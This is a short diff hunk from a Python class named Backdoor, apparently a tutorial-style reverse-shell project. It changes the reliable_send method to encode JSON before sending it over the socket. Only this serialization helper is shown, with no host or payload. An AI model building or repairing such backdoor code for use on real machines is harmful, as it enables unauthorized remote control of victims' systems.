@@ -16,7 +16,7 @@ class Backdoor:
     def reliable_send(self, data):
         # Serialisation
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = b""
